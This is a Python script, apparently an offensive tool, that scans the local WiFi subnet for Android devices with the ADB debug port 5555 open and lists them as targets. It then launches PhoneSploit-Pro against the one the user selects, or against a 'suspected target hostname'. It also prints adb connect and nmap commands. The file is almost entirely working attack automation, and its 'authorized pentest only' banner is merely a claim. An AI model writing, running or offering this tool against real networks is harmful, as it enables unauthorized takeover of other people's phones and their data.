#!/usr/bin/env python3
"""
WiFi Target Auto-Discoverer + PhoneSploit-Pro Launcher
Theoretical pentest tool for authorized Android device exploitation
"""

import subprocess
import socket
import threading
import time
import netifaces
import argparse
from typing import List, Dict, Optional
import re

class WiFiTargetFinder:
    def __init__(self, interface: str = None):
        self.interface = interface or self._get_default_wifi()
        self.targets = []
    
    def _get_default_wifi(self) -> str:
        """Auto-detect WiFi interface"""
        for iface in netifaces.interfaces():
            if 'wlan' in iface.lower() or 'wifi' in iface.lower():
                return iface
        raise ValueError("No WiFi interface found")
    
    def get_local_network(self) -> str:
        """Get local subnet (192.168.x.x/24)"""
        addrs = netifaces.ifaddresses(self.interface)
        ip_info = addrs[netifaces.AF_INET][0]
        return '.'.join(ip_info['addr'].split('.')[:-1]) + '.'
    
    def scan_hosts(self) -> List[Dict]:
        """Aggressive network scan (nmap-style ping sweep)"""
        network = self.get_local_network()
        print(f"[+] Scanning {network}0-255...")
        
        def ping_host(ip: str) -> bool:
            # Use fping if available, fallback to ping
            try:
                result = subprocess.run(['ping', '-c', '1', '-W', '1', ip], 
                                      capture_output=True, timeout=2)
                return result.returncode == 0
            except:
                return False
        
        alive_hosts = []
        threads = []
        for i in range(1, 255):
            ip = f"{network}{i}"
            t = threading.Thread(target=lambda: alive_hosts.append(ip) if ping_host(ip) else None)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join(timeout=0.1)
        
        # Port scan top services for identification
        self.targets = self._identify_devices(alive_hosts)
        return self.targets
    
    def _identify_devices(self, ips: List[str]) -> List[Dict]:
        """Quick service scan for device fingerprinting"""
        devices = []
        for ip in ips[:20]:  # Limit to prevent DoS
            try:
                # Check common Android debug ports
                sock = socket.socket()
                sock.settimeout(0.5)
                if sock.connect_ex((ip, 5555)) == 0:
                    devices.append({'ip': ip, 'port': 5555, 'type': 'ADB-Open'})
                sock.close()
            except:
                pass
        return devices

class PhoneSploitLauncher:
    def __init__(self):
        self.phsploit_path = "./PhoneSploit-Pro"  # Adjust path
    
    def auto_connect(self, target_ip: str, target_port: int = 5555):
        """Launch PhoneSploit-Pro automation"""
        cmd = [
            "python3", f"{self.phsploit_path}/phonesploit.py",
            "--rhost", target_ip,
            "--rport", str(target_port)
        ]
        print(f"[+] Launching PhoneSploit-Pro: {' '.join(cmd)}")
        subprocess.run(cmd)
    
    def interactive_connect(self, target_ip: str):
        """Manual PhoneSploit-Pro session"""
        print(f"[+] Connect manually: adb connect {target_ip}:5555")
        print(f"[+] Then: cd PhoneSploit-Pro && python3 phonesploit.py")

def main():
    parser = argparse.ArgumentParser(description="WiFi Auto-Target PhoneSploit Launcher")
    parser.add_argument("--interface", "-i", help="WiFi interface")
    parser.add_argument("--manual", action="store_true", help="Force manual mode")
    args = parser.parse_args()
    
    finder = WiFiTargetFinder(args.interface)
    launcher = PhoneSploitLauncher()
    
    # AUTO MODE: Hostname search first
    if not args.manual:
        hostname = input("[AUTO] Suspected target hostname (or Enter to skip): ").strip()
        if hostname:
            print(f"[+] Resolving {hostname}...")
            try:
                target_ip = socket.gethostbyname(hostname)
                print(f"[+] Found: {target_ip}")
                launcher.auto_connect(target_ip)
                return
            except:
                print("[-] Hostname resolution failed, switching to manual...")
    
    # FULL SCAN MODE
    print("[+] Scanning network...")
    targets = finder.scan_hosts()
    
    if not targets:
        print("[-] No ADB devices found. Run manual nmap:")
        print("nmap -sV --script adb-info 192.168.x.x/24")
        return
    
    print("\n[+] LIVE ADB TARGETS:")
    for i, target in enumerate(targets):
        print(f"  {i}: {target['ip']}:{target['port']} ({target['type']})")
    
    # User selection
    try:
        choice = int(input("\nSelect target (0-based index): "))
        selected = targets[choice]
        print(f"[+] Selected: {selected['ip']}:{selected['port']}")
        
        confirm = input("[?] Launch PhoneSploit-Pro? (y/N): ")
        if confirm.lower() == 'y':
            launcher.auto_connect(selected['ip'], selected['port'])
        else:
            launcher.interactive_connect(selected['ip'])
            
    except (ValueError, IndexError):
        print("[-] Invalid selection")

if __name__ == "__main__":
    print("=== WiFi PhoneSploit Auto-Targeter (Authorized Pentest Only) ===")
    main()
